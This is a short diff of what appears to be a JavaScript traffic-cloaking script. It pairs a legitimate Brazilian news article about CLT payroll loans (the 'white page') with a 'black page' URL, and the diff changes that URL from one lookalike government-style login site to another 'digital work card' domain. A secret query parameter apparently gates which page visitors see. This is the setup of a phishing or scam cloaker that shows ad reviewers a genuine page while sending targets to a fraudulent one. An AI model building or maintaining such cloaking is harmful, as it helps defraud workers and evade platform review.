@@ -8,7 +8,7 @@ const whitePage =
   process.env.WHITE_PAGE ||
   "https://www.gazetadopovo.com.br/economia/consignado-clt-governo-assina-mp-como-vai-funcionar/";
 const blackPage =
-  process.env.BLACK_PAGE || "https://www.cidadaoconsulta.chat/login/";
+  process.env.BLACK_PAGE || "https://www.carteiradigitaldetrabalho.com/noticia/";
 
 // Parâmetros de segurança
 const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
